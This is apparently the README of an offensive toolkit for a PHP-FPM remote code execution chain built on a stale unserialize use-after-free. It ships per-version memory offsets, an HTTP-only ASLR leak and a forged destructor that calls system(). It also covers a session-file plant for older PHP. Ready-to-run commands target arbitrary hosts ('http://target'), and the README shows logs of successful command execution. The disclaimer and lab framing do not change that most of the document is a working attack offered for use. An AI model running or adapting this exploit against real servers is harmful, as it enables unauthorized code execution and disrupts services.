# php2shell-nginx-fpm-full-rce

[![CI](https://github.com/VABISMO/php2shell-nginx-fpm-full-rce/actions/workflows/ci.yml/badge.svg)](https://github.com/VABISMO/php2shell-nginx-fpm-full-rce/actions/workflows/ci.yml)
[![Live FPM lab](https://github.com/VABISMO/php2shell-nginx-fpm-full-rce/actions/workflows/live-fpm.yml/badge.svg)](https://github.com/VABISMO/php2shell-nginx-fpm-full-rce/actions/workflows/live-fpm.yml)
[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![PHP](https://img.shields.io/badge/PHP-8.2%20to%208.4%20verified-777bb4.svg)](https://www.php.net/)
[![Python](https://img.shields.io/badge/Python-3.11%2B-3776AB.svg)](https://www.python.org/)

A self-contained **nginx + PHP-FPM RCE** laboratory and exploit client for the
cross-request `BG(unserialize)` stale-state chain. It ships verified profiles
for **PHP 8.2.34, 8.3.35, 8.4.0, 8.4.25 and 8.4.26** (fixed upstream in
8.2.35 / 8.3.36 / 8.4.27 / 8.5.12) plus the pre-auth **session-file plant**
that covers PHP 5.4-7.x. This is the FPM-only extraction of
[`devploit/php2shell`](https://github.com/devploit/php2shell): no Apache code,
no Docker, no root.

> **Authorized security testing only.** Use this only on systems you own or
> have explicit written permission to test. The chain sends large bodies,
> triggers OOM conditions, and kills PHP-FPM workers. Run it against disposable
> local laboratories. See [LICENSE](LICENSE) and [SECURITY.md](SECURITY.md)
> (support matrix, reporting, disclosure timeline).

**Keywords:** PHP-FPM RCE, nginx PHP-FPM exploit, CVE-2026-109619, PHP 8.2,
PHP 8.3, PHP 8.4, PHP 8.4.27, session deserialization, `BG(unserialize)`, stale pointer,
use-after-free, ASLR bypass, HTTP-only leak, no-oracle, `zif_system`, FastCGI,
nginx security research, PHP session upload progress, exploitation laboratory.

## Table of contents

- [What this is](#what-this-is)
- [Affected builds](#affected-builds)
- [How the chain works](#how-the-chain-works)
- [Repository layout](#repository-layout)
- [Requirements](#requirements)
- [Quick start](#quick-start)
- [Default-installation mode](#default-installation-mode)
- [Exploit modes](#exploit-modes)
- [Verified output](#verified-output)
- [Laboratory details](#laboratory-details)
- [Profile and offsets](#profile-and-offsets)
- [Remote calibration of any version](#remote-calibration-of-any-version)
- [Session-file plant (PHP 5.4-8.x)](#session-file-plant-php-54-8x)
- [HTTP-only base leak](#http-only-base-leak)
- [Testing](#testing)
- [CI/CD](#cicd)
- [Troubleshooting](#troubleshooting)
- [Security model, remote scope, and limitations](#security-model-remote-scope-and-limitations)
- [FAQ](#faq)
- [Legal and responsible use](#legal-and-responsible-use)
- [Credits](#credits)

## What this is

This repository contains:

- a Python client for the PHP-FPM session/unserialize stale-state chain;
- a reproducible user-prefix nginx + PHP-FPM laboratory that runs any built
  version (7.2 through 8.5) without root or Docker;
- an HTTP-only leak that recovers the Zend-MM chunk and php-fpm PIE bases from
  a stale session string, removing `/proc/<pid>/mem` from the exploit path;
- a two-slot, self-correcting endgame that forges a `zend_reference` →
  `HashTable` → `zif_system` destructor chain;
- a single-surface **amplifier arm** (`session_decode` of a wide nested
  array) plus a growth fallback, so a stock installation shape — one port,
  one pool, `memory_limit=128M`, five dynamic workers — is enough
  ([Default-installation mode](#default-installation-mode));
- a `probe` command that reports, target by target, which chain
  preconditions hold;
- unit tests, profile validation, live lab tests, and GitHub Actions CI.

The target needs an **application operation** that calls `session_start()` and
reflects session values, one that stores a reference in the session, and an
arm operation (a `session_decode()` of attacker data, or session
accumulation). The included `lab/fpm/webroot/app.php`, `ref.php` and
`grow.php` are those stand-ins. This is not a generic scanner and does not
magically exploit every PHP-FPM deployment: the application operations and
session storage must match the model — `probe` checks exactly that.

## Affected builds

Upstream fixed the bug on 2026-10-21 with `php_basic_early_rinit()`, called
from `php_request_startup()` *before* the request body is parsed, which
memsets `BG(unserialize)`:

| Branch | Vulnerable | Fixed | Status in this repository |
| --- | --- | --- | --- |
| 8.5 | 8.5.0 – 8.5.11 | 8.5.12 | builds only (not calibrated) |
| 8.4 | 8.4.0 – 8.4.26 | 8.4.27 | **verified profiles (8.4.0, 8.4.25, 8.4.26)** |
| 8.3 | 8.3.0 – 8.3.35 | 8.3.36 | **verified profile (8.3.35)** |
| 8.2 | 8.2.0 – 8.2.34 | 8.2.35 | **verified profile (8.2.34)** |
| 8.1, 8.0 | every release | **never patched** | upstream bug present, **chain verified end to end** (profiles 8.0.30, 8.1.33) |
| 7.x (all) | every release | **never patched** | upstream bug present, `poison` applies; a chain run has not been recorded yet (see below) |
| 5.6, 5.5, 5.4 | every release | **never patched** | `upload_progress` exists from 5.4, so `poison` applies; 5.0-5.3 have no attack surface |

`tools/php2shell_fpm_versions.py` is the single source of truth for that
matrix: `is_vulnerable()`, `fixed_in()`, `affected_versions()`, and
`source_is_fixed()` (which classifies a tarball by the presence of the fix
marker instead of trusting a version string).

<!-- coverage:start -->
Coverage generated from `profiles/*-fpm.json`, `profiles/verification.json` and the version registry:

| Status | Versions |
| --- | --- |
| RCE over HTTP only | `8.0.30`, `8.1.33`, `8.2.34`, `8.3.35`, `8.4.0`-`8.4.26` |
| Session-file plant (pre-auth write) | `5.4.45`, `5.5.38`, `5.6.40`, `7.2.34`, `7.4.33` |
| Patched upstream (cannot RCE) | `8.2.35`, `8.3.36`, `8.4.27`, `8.5.12` |
| Out of scope | `5.0`-`5.3` (no `session.upload_progress`), `8.5.x` (not calibrated) |

<!-- coverage:end -->

| Item | Value |
| --- | --- |
| Vulnerable builds | any release of the branches above, amd64, nginx + PHP-FPM |
| Fixed builds | 8.2.35, 8.3.36, 8.4.27, 8.5.12 (check any pair with `patchcheck --version <vulnerable>`) |
| SAPI | `fpm` only |
| Profiles | `profiles/<version>-fpm.json`; verified ones carry `"rce": true` |
| Runtime proof | `uid=1000(...)` from `id` in the FPM worker |
| Worker impact | one consumer worker aborts after the command; FPM respawns it |
| Expected HTTP result | `502` after the fire; the proof file is the reliable signal |

The verified profiles are Debian-style, user-prefix PHP builds compiled by
`lab/fpm/build_php.sh`. Another distribution, architecture, or patch level
needs its own offsets; `calibrate` derives them over HTTP (see
[Remote calibration](#remote-calibration-of-any-version)).

### PHP 8.0 and 8.1: why the chain works there too

An early version of this document claimed the chain needs PHP 8.2+ because
`php_session_cancel_decode()` first appears there. That claim was wrong, and
the source shows why:

- `php_var_unserialize_init()` reuses `BG(unserialize).data` whenever
  `level > 0` - that logic exists unchanged since PHP 5;
- `BG(unserialize).data` is an `emalloc` block; the Zend memory manager
  releases it at request end on **every** version, so the pointer is
  dangling (reclaimable) either way;
- `php_session_cancel_decode()` (8.2+) only runs `php_session_destroy()`,
  which **unlinks the session file** - it never touches the struct.

The empirical proof closed the argument: `calibrate` ran against 8.0.30
and 8.1.33 over HTTP only and both produced the RCE proof
(`profiles/8.0.30-fpm.json`, `profiles/8.1.33-fpm.json`), and
`chain_applies()` now accepts every8.x release. The one real difference
the function makes is the unlink: an 8.2+ arm destroys the session file
(the client rebuilds it every iteration), older builds keep it.

The advisory exposure on the remaining branches (7.x, 5.x) is the other
side of `session.upload_progress`, implemented here as `poison` (see
[Session-file plant (PHP 5.4-8.x)](#session-file-plant-php-54-8x)).
`php2shell_fpm_versions.has_session_cancel_decode()` reads that fact from the
source tree or a release tarball, and `php2shell_fpm_matrix.py` runs `poison`
on those builds. `lab/fpm/build_php.sh` also fixes the two places 7.x
mis-detect modern glibc (the POSIX three-argument `readdir_r()` and the
`fopencookie` seek handler), so 7.2/7.4 build with a current toolchain.

## How the chain works

The chain abuses a cross-request stale `php_unserialize_data` state left in
`BG(unserialize)` after an out-of-memory bailout. The short version:

```text
producer request
  GET /app.php with a large session
  -> session_start() decodes the session after RINIT
  -> 4 MB value triggers OOM
  -> php_execute_script catches the bailout; worker survives
  -> BG(unserialize) keeps {level=1, data=d}; d points at freed memory

consumer request
  POST multipart /app.php
  -> rfc1867 runs inside php_hash_environment(), before RINIT
  -> php_session_initialize() reuses stale d
  -> controlled 16 KB buffer reclaims d and forges var_hash
  -> R:2 resolves to a fake IS_REFERENCE
  -> fake HashTable's pDestructor = zif_system
  -> session shutdown calls zif_system(command)
  -> command runs, worker aborts, FPM respawns it
```

Detailed steps:

1. **Arm the stale state.** A post-RINIT OOM in `session_start()` must be
   caught by the request executor, not by FPM's fatal path. The producer uses
   the builder pool's large session file and the chain pool's `app.php`.
2. **Reclaim the stale struct.** The consumer is multipart because the rfc1867
   handler starts the session before `zend_activate_modules()` / RINIT. The
   reclaimed buffer is planted at the freed 8216-byte struct. A 16384-byte
   reclaim covers both known slots.
3. **Leak the absolute bases (optional but enabled by default).** A stale
   short-session string is pointed at a forged `zend_string` header. Its
   oversized length spans the stale zval array (chunk pointer) and an
   `execute_ex` handler pointer (PIE). The app reflects `r`, giving both bases
   over HTTP without `/proc/<pid>/mem`.
4. **Forge the destructor chain.** The forged memory contains a fake
   `zend_reference`, a fake `zend_array` with `pDestructor = zif_system`, an
   `execute_data` frame, and a fake `zend_string` holding the command.
5. **Fire at session shutdown.** `php_session_flush`, then
   `php_rshutdown_session_globals` → `zval_ptr_dtor` → reference destroy →
   fake array destroy → `zif_system`. `popen` runs the command; the worker
   aborts and FPM respawns it.

The useful mental model is: **post-RINIT OOM leaves a stale pointer; pre-RINIT
multipart session decode reclaims it; session shutdown gives the fake destructor
control of the worker.** The HTTP leak is separate: it turns the stale
short-session string into an OOB read primitive for ASLR bases.

## Repository layout

```text
.
├── .github/workflows/         CI, live-lab and release workflows
├── lab/fpm/
│   ├── build_php.sh           build PHP into lab/fpm/runtime (no root)
│   ├── build_all.sh           build several versions at once
│   ├── build_nginx.sh         build nginx into lab/fpm/runtime (no root)
│   ├── nginx.conf.in          one nginx front for chain + builder pools
│   ├── php-fpm.conf.in        chain (8M) and builder (64M) pools
│   ├── php-fpm.default.conf.in  one stock-settings pool (default mode)
│   ├── php.ini                session/upload-progress lab configuration
│   └── webroot/
│       ├── app.php            session application operation / leak channel
│       ├── index.php          health check
│       ├── ref.php            creates `r` as a reference to `a`
│       ├── bigvar.php         large stale-session arm page
│       ├── grow.php           accumulating / amplifier arm endpoint
│       ├── leakvar.php        tunable stale-string arm page
│       └── refb.php           benign short-session builder
├── profiles/
│   ├── 8.0.30-fpm.json        verified offsets and heap geometry
│   ├── 8.1.33-fpm.json        verified offsets and heap geometry
│   ├── 8.2.34-fpm.json        verified offsets and heap geometry
│   ├── 8.3.35-fpm.json        verified offsets and heap geometry
│   ├── 8.4.0-fpm.json         verified offsets and heap geometry
│   ├── 8.4.25-fpm.json        verified offsets and heap geometry
│   ├── 8.4.26-fpm.json        verified offsets and heap geometry (both arms)
│   └── schema.json            profile validator
├── tests/test_fpm.py          unit + opt-in live tests
├── tools/
│   ├── php2shell_fpm.py       exploit client (leak, no-oracle, calibrate, poison)
│   ├── php2shell_fpm_matrix.py  verify every unpatched build
│   ├── php2shell_fpm_profile.py draft profile generator
│   ├── php2shell_fpm_versions.py affected-version registry
│   ├── php2shell_fpm_offsets.c  struct offsets compiled per build
│   ├── php2shell_fpm_labs.py  user-prefix nginx/FPM launcher
│   └── readme_table.py        regenerate the README profile table
├── Makefile
├── requirements-dev.txt
└── pyproject.toml
```

## Requirements

- Linux **amd64** (the profile is verified on Debian-style builds).
- Python **3.11+**.
- `gcc`, `make`, `curl`, `tar` for the local source builds.
- nginx and PHP source tarballs are downloaded by the build scripts.
- No root, no Docker.
- Optional: `jsonschema` for profile validation, `ruff` for linting.
- The `endgame` oracle needs `kernel.yama.ptrace_scope=0`; `no-oracle` does not
  read process memory.

Against a remote default installation the client additionally needs request
bodies of ~5 MB to pass through the front (nginx
`client_max_body_size 5m`; the stock `1m` is too small to push a
128M `memory_limit` over with the amplifier). `post_max_size` defaults to 8M
and is enough; Apache has no equivalent default cap.

On Debian/Ubuntu, the build prerequisites are roughly:

```sh
sudo apt-get update
sudo apt-get install -y build-essential curl tar python3 python3-venv
```

Add `libxml2-dev` if your PHP configure step asks for libxml2 headers.

## Quick start

### 1. Build nginx and the vulnerable PHP

```sh
lab/fpm/build_nginx.sh
lab/fpm/build_php.sh 8.4.26
```

Both install under `lab/fpm/runtime/`, which is ignored by git. The PHP build is
a minimal `--disable-all --enable-cli --enable-fpm --enable-session` build.
Build 8.4.25 for the second verified vulnerable profile, or 8.4.27 for
`patchcheck`:

```sh
lab/fpm/build_php.sh 8.4.25
lab/fpm/build_php.sh 8.4.27
```

### 2. Start the lab

```sh
python3 tools/php2shell_fpm_labs.py up --only 8.4.26
# or: up --only 8.4.25,8.4.26
python3 tools/php2shell_fpm_labs.py status
python3 tools/php2shell_fpm_labs.py smoke
```

### 3. Run the HTTP-only exploit

```sh
python3 tools/php2shell_fpm.py \
  --base http://127.0.0.1:8110 \
  --builder http://127.0.0.1:8111 \
  --version 8.4.26 \
  --command 'id>out/p1' \
  --proof-file out/p1 \
  no-oracle
```

A successful run ends with a proof line and a consumer `status=502`. Fetch it:

```sh
curl http://127.0.0.1:8110/out/p1
```

### 4. Stop the lab

```sh
python3 tools/php2shell_fpm_labs.py down
```

## Default-installation mode

The chain runs against a **stock nginx + PHP-FPM shape** with one command:
one port, one pool, `memory_limit=128M`, `pm=dynamic` with five workers,
`post_max_size=8M`, `session.upload_progress.cleanup=On` - the php.ini
production defaults, not a hand-tuned laboratory:

```sh
python3 tools/php2shell_fpm.py \
  --base http://target \
  --version 8.4.26 \
  --command 'id>out/p1' --proof-file out/p1 no-oracle
```

`--builder` defaults to `--base`, so `--arm-mode auto` picks the
**amplified `session_decode` arm**: a single POST whose payload is a wide
array of nested sub-arrays.  Decoding it multiplies memory roughly 22x per
payload byte *while `BG(unserialize).level == 1`*, so the OOM lands inside
`unserialize()` - the producer arm - with no big session file, no second
pool, and no `memory_limit` split.  Every pool worker is armed and the
consume is fanned out over them, so `pm.max_children` does not matter
either.  A session-growing fallback (`--grow-path`, see
[Exploit modes](#exploit-modes)) covers fronts that cap request bodies too
low for the amplifier.

Verified output on the default-installation laboratory (8.4.26, single
pool, five dynamic workers):

```text
$ python3 tools/php2shell_fpm.py --base http://127.0.0.1:8110 \
    --version 8.4.26 --command 'id>out/p1' --proof-file out/p1 no-oracle
[*] arm: amplified session_decode OOM (single request)
[*] HTTP leak attempt 0: chunk=0x7fa52ce00000 pie=0x5626ba200000
[*] no-oracle: chunk=0x7fa52ce00000 pie=0x5626ba200000 zif=0x5626ba586660
[*] consumer status=502
[*] attempt 0.0: d=0x7fa52ce81000 k=0xfe8 status=502
[+] RCE proof via /out/p1: b'uid=1000(...) ...'
```

### What a default target still needs

Run `probe` against a target to get this checklist as a report:

| Need | Why | Check |
| --- | --- | --- |
| a vulnerable 8.x build | the stale `BG(unserialize)` state (8.0 - 8.4.26, 8.5.0 - 8.5.11) | `probe` prints the registry verdict |
| an application operation that calls `session_start()` | the arm decodes the session after RINIT | any session-using app |
| a session that stores a reference (`R:N`) | the hook the forged `var_hash` redirects | `probe` via `/ref.php` |
| a reflection of a session value | the HTTP leak of the ASLR bases (or pass `--chunk/--pie`) | `probe` via `/app.php` |
| an operation that decodes attacker-controlled session data (`session_decode`) or appends attacker data to the session | the decode-side OOM (amplifier or growth) | `probe` via `/grow.php` |
| bodies of ~5 MB accepted | nginx `client_max_body_size 5m` (stock is `1m`); `post_max_size` defaults to 8M and is enough. Apache has no such default cap | `probe` descends a body ladder and says so |

Everything else a default installation ships is fine as-is: one pool, one
port, `memory_limit=128M`, `pm=dynamic`, `cleanup=On`, `post_max_size=8M`,
the `php` serializer, `files` session storage, `session.lazy_write` in
either state.

### What the classic mode still needs

The two-surface builder path (`--arm-mode builder`, the default when
`--builder` points at a different origin) is unchanged and remains the
fallback for targets without a `session_decode`/accumulating operation:
two HTTP surfaces with different `memory_limit` values, as described in
[Security model, remote scope, and limitations](#security-model-remote-scope-and-limitations).
Both surfaces can share **one port** behind a path prefix:

```sh
python3 tools/php2shell_fpm.py --base http://target \
  --builder http://target --builder-prefix /b \
  --version 8.4.26 ... no-oracle
```

## Exploit modes

The remote path is the product; every command in it works over HTTP against a
target you can only reach with requests.

| Command | Purpose | `/proc/<pid>/mem` | Notes |
| --- | --- | --- | --- |
| `calibrate` | Discover leak + reclaim geometry of any build | no | writes the profile; no arguments to feed |
| `probe` | Checklist: does this target meet every precondition? | no | version, app operations, reflection, reference, arm physics |
| `poison` | Session-file plant: chosen bytes into a chosen `sess_<sid>` | no | the chain for PHP <= 7.x |
| `leak` | Print chunk and PIE bases over HTTP | no | retries after worker death |
| `no-oracle` | Full RCE without process memory | no | HTTP leak; no `/proc` fallback by default |
| `endgame` | Oracle-calibrated full RCE | yes | local lab only |
| `primitive` | Benign forged `var_entries`, observable via `app.php` | yes | useful calibration test |
| `patchcheck` | Any vulnerable release vs its fixed counterpart | yes | registry derives the pair |
| `chain` | Full pipeline (`primitive` or `endgame`) | yes | used by the lab runner |
| `lifecycle` | Worker-death matrix | no | lab diagnostics |
| `oracle` | Dump worker pid, bases, `d`, level | yes | lab diagnostics |
| `reclaim-probe` | Sweep pad sizes/geometry | yes | calibration |
| `build-oom` / `build-ref` | Build sessions directly | no | builder diagnostics |

Both `leak` and `no-oracle` accept `--chunk 0x...` and `--pie 0x...` overrides.
`no-oracle` fails if the HTTP leak fails; it does not touch local `/proc` unless
you explicitly add `--allow-local-fallback` (lab-only).

The application/builder surface names are configurable without editing code:
`--app-path` (default `/app.php`), `--arm-path` (default profile leak arm),
`--ref-path` (default `/ref.php`), `--probe-path` (404/no-op reclaim probe,
default `/nope.php`), `--grow-path` (default `/grow.php`, the accumulating /
amplifier endpoint), and `--session-cookie` (default `PHPSESSID`). The target
application must still provide the session operations described below.

## Verified output

Reference run on the local 8.4.26 lab:

```text
$ python3 tools/php2shell_fpm.py --base http://127.0.0.1:8110 \
    --builder http://127.0.0.1:8111 --version 8.4.26 leak
[*] HTTP leak attempt 1: chunk=0x7f4f48800000 pie=0x55d75fc00000
[+] chunk=0x7f4f48800000 pie=0x55d75fc00000
```

```text
$ python3 tools/php2shell_fpm.py --base http://127.0.0.1:8110 \
    --builder http://127.0.0.1:8111 --version 8.4.26 \
    --command 'id>out/p1' --proof-file out/p1 no-oracle
[*] bases from HTTP stale-string leak: pie=0x55d75fc00000 chunk=0x7f4f48800000
[*] no-oracle: chunk=0x7f4f48800000 pie=0x55d75fc00000 zif=0x55d75ff86660
[*] consumer status=502
[*] attempt 0: d=0x7f4f48881000 k=0xfe8 status=502
[+] RCE proof via /out/p1: b'uid=1000(...) ...'
```

```text
$ curl http://127.0.0.1:8110/out/p1
uid=1000(cryptocalypse) gid=1000(cryptocalypse) groups=...
```

The same commands work on every shipped profile; only the symbol offsets and
the heap geometry differ (see [Profile and offsets](#profile-and-offsets)).

`make matrix` re-verifies one representative per branch over HTTP and records
the verdicts in `profiles/verification.json`; the
[coverage table](#affected-builds) in this README is generated from those
verdicts plus the shipped profiles, so it cannot drift from reality.

The `502` is expected: the worker dies after executing the command and FPM
respawns it. Do not treat `502` as a failed exploit; check the proof file.

## Laboratory details

The lab uses one nginx front and two PHP-FPM pools per build:

| Build | chain HTTP | builder HTTP | chain FPM | builder FPM |
| --- | --- | --- | --- | --- |
| 5.4.45 | :8648 | :8649 | :9548 | :9549 |
| 5.5.38 | :8726 | :8727 | :9626 | :9627 |
| 5.6.40 | :8808 | :8809 | :9708 | :9709 |
| 7.2.34 | :8268 | :8269 | :9168 | :9169 |
| 7.4.33 | :8336 | :8337 | :9236 | :9237 |
| 8.0.30 | :8870 | :8871 | :9770 | :9771 |
| 8.1.33 | :8938 | :8939 | :9838 | :9839 |
| 8.2.34 | :8406 | :8407 | :9306 | :9307 |
| 8.3.35 | :8478 | :8479 | :9378 | :9379 |
| 8.4.0 | :8480 | :8481 | :9380 | :9381 |
| 8.4.25 | :8130 | :8131 | :9021 | :9022 |
| 8.4.26 | :8110 | :8111 | :9001 | :9002 |
| 8.4.27 | :8120 | :8121 | :9011 | :9012 |

Every other built version gets a block of its own from
`php2shell_fpm_labs.builds_map()`; `labs.py ports`-style output is just that
mapping.

- **chain** — `memory_limit=8M`, `session.upload_progress.cleanup=On`,
  one static worker. This is the consumer/exploit target.
- **builder** — `memory_limit=64M`, `cleanup=Off`, one static worker. This
  builds the large session files and keeps them around for the next request.

Two endpoints are required: posting the 4 MB arm to the 8 MB chain pool would
kill the consumer worker before the fire.

`labs.py up --mode default` renders a second, deliberately boring shape for
[Default-installation mode](#default-installation-mode): ONE pool per build
with the php.ini production settings (`memory_limit=128M`, `pm=dynamic` with
five workers, `post_max_size=8M`, `session.upload_progress.cleanup=On`,
`session.lazy_write=On`) behind ONE nginx server block whose only non-stock
line is `client_max_body_size 8m`. The classic chain server additionally
exposes the builder pool behind `/b/` through a `b -> .` webroot symlink (no
regex location, so the PCRE-free lab nginx accepts it) — that is the surface
`--builder-prefix /b` uses for single-origin classic runs.

All ports bind to `127.0.0.1`. The proof directory
`lab/fpm/webroot/out/` is served statically by nginx as `/out/`.

## Profile and offsets

<!-- profile-table:start -->
Every shipped profile is `verified: true` / `rce: true`, produced by the automatic `calibrate` run against a live build:

| Version | zif_system | zval_ptr_dtor | basic_globals | BG offs | reclaim | no_oracle | chunk base | PIE base |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |
| 8.0.30 | `0x359b20` | `0x4145e0` | `0xa14b60` | 3472/3480 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x47425d` |
| 8.1.33 | `0x367ca0` | `0x427120` | `0xa14c80` | 3376/3384 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x48d033` |
| 8.2.34 | `0x3769d0` | `0x439120` | `0xa15220` | 848/856 | [4096, 4096] x 16384 | 0x80000+0xfe8 | `0x8c000` | `0x4a2c85` |
| 8.3.35 | `0x37d5f0` | `0x446460` | `0xa14e80` | 856/864 | [4096, 4096] x 16384 | 0x80000+0xfe8 | `0x8c000` | `0x4b24f6` |
| 8.4.0 | `0x384380` | `0x542dd0` | `0xa04580` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e4467` |
| 8.4.1 | `0x384380` | `0x542e50` | `0xa04580` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e44e7` |
| 8.4.2 | `0x384340` | `0x542f90` | `0xa04580` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e4627` |
| 8.4.3 | `0x384570` | `0x543f10` | `0xa04580` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e55a7` |
| 8.4.4 | `0x384bb0` | `0x544990` | `0xa04580` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e5f67` |
| 8.4.5 | `0x384e70` | `0x545350` | `0xa04580` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e6927` |
| 8.4.6 | `0x384fb0` | `0x5456d0` | `0xa04580` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e6aa7` |
| 8.4.7 | `0x384f70` | `0x545910` | `0xa04580` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e6aa7` |
| 8.4.8 | `0x384f30` | `0x545890` | `0xa04580` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e6a07` |
| 8.4.9 | `0x384e70` | `0x545b10` | `0xa04580` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e6c47` |
| 8.4.10 | `0x384e70` | `0x545ad0` | `0xa04580` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e6c07` |
| 8.4.11 | `0x384ff0` | `0x545d50` | `0xa04660` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e6e47` |
| 8.4.12 | `0x384f30` | `0x546150` | `0xa04660` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e7007` |
| 8.4.13 | `0x384f70` | `0x546250` | `0xa04660` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e7107` |
| 8.4.14 | `0x384f30` | `0x546510` | `0xa04660` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e7387` |
| 8.4.15 | `0x384f30` | `0x546550` | `0xa04660` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e7307` |
| 8.4.16 | `0x3852a0` | `0x546c10` | `0xa04660` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e7947` |
| 8.4.17 | `0x385320` | `0x546fd0` | `0xa04660` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e7bc7` |
| 8.4.18 | `0x385320` | `0x547310` | `0xa04660` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e7cc7` |
| 8.4.19 | `0x3852e0` | `0x5474d0` | `0xa04660` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e7e87` |
| 8.4.20 | `0x3854a0` | `0x547e90` | `0xa04660` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e87c7` |
| 8.4.21 | `0x385360` | `0x548490` | `0xa04660` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e8c87` |
| 8.4.22 | `0x3854e0` | `0x548610` | `0xa04660` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e8e07` |
| 8.4.23 | `0x3852a0` | `0x548450` | `0xa04660` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e8b87` |
| 8.4.24 | `0x385f20` | `0x5490d0` | `0xa04660` | 872/880 | [4096, 4096] x 16384 | 0x7f000+0xfe8 | `0x8b000` | `0x4e9807` |
| 8.4.25 | `0x386460` | `0x549890` | `0xa04660` | 872/880 | [4096, 4096] x 12288 | 0x7f000+0xfe8 | `0x8b000` | `0x4e9fc7` |
| 8.4.26 | `0x386660` | `0x54a0d0` | `0xa04660` | 872/880 | [4096, 4096] x 12288 | 0x7f000+0xfe8 | `0x8b000` | `0x4ea787` |

Identical on every build: struct_size `8216`, leak arm `/bigvar.php`, leak pads `[32768, 16384]`, forged header `0x17e8`, chunk pointer offset `0x77f8`.

<!-- profile-table:end -->

Validate the profile:

```sh
python3 -c "import glob, json, jsonschema; \
  s = json.load(open('profiles/schema.json')); \
  [jsonschema.validate(json.load(open(p)), s) for p in glob.glob('profiles/*-fpm.json')]; \
  print('profiles valid')"
```

Another PHP build or distro needs a new profile with its own symbols, struct
size, heap geometry, and leak offsets. Generate a draft from an unstripped
`php-fpm` binary:

```sh
python3 tools/php2shell_fpm_profile.py \
  --php-fpm lab/fpm/runtime/php-8.4.25/sbin/php-fpm \
  --version 8.4.25
```

The generator extracts `zif_system`, `zval_ptr_dtor`, and `basic_globals` with
`nm`, compiles `tools/php2shell_fpm_offsets.c` against the build's own headers
for the struct layouts, and parses `php_unserialize_data` from the source tree.
The result is always
`verified: false` / `rce: false`: symbols and layouts do not prove the heap
geometry, so run `calibrate` before trusting it.

## Remote calibration of any version

`calibrate` derives everything a profile needs **with HTTP requests only** —
no `/proc`, no local shell, no FPM PID. It is the same traffic the exploit
sends, so a build that calibrates is a build that exploits:

```sh
python3 tools/php2shell_fpm.py \
  --version 8.2.34 \
  --base http://127.0.0.1:8406 --builder http://127.0.0.1:8407 \
  calibrate
```

Three phases, each validated by the answer of the target:

1. **Leak geometry** — the forged `zend_string` header is tried at a few
   content offsets; a geometry is accepted when two consecutive OOB reads
   expose a chunk pointer and a PIE pointer at the *same* offsets. The chunk
   base is 2 MB aligned, which fixes `chunk_base_off` on its own.
2. **Reclaim geometry** — the primitive (a forged `IS_LONG` zval reflected by
   `app.php`) needs no PIE base, so it isolates the heap geometry: the search
   walks pad/size shapes and `(chunk offset, content offset)` pairs until the
   value comes back in the response.
3. **PIE base** — the leaked pointer is rounded down to 2 MB boundaries and
   each candidate is proven with a remote endgame until the proof file
   appears.

The result is written into `profiles/<version>-fpm.json`, after which
`no-oracle` reproduces the RCE against that build.

## Session-file plant (PHP 5.4-8.x)

The second half of `session.upload_progress` works on **every** version,
including PHP <= 7.x where the struct-freeing chain does not apply:

1. `MULTIPART_EVENT_FORMDATA` copies the session id **from the POST body**
   without consulting `session.use_only_cookies`
   (`ext/session/session.c`, `name_len == progress->sname_len` branch);
2. `MULTIPART_EVENT_FILE_START` installs it as `PS(id)` and writes the
   progress data there — carried by `session.upload_progress.cleanup=Off` on
   the builder pool;
3. the upload **filename** is stored as `current_file.name` and serialized
   into that file, so chosen bytes land in a session file of the attacker's
   choosing (`php_session_valid_key` limits the name to `[a-zA-Z0-9,-]`, so
   the choice is inside `save_path`, not a path traversal);
4. the application deserializes the file on its next `session_start()` and
   reflects the contents — over HTTP, no `/proc` anywhere.

```sh
python3 tools/php2shell_fpm.py --version 7.4.33 \
  --base http://127.0.0.1:8336 --builder http://127.0.0.1:8337 \
  poison --sid poison7xtest01 --payload 'PLANTED_MARKER_7X_OK'
```

Verified output on 7.4.33:

```
[*] plant status=404 sid='poison7xtest01'
[*] session file .../php-7.4.33/session/sess_poison7xtest01 (348 bytes)
[*] application reflects the session: YES
    ...b'0:"field_name";s:1:"f";s:4:"name";s:20:"PLANTED_MARKER_7X_OK";...'
[+] plant VERIFIED
```

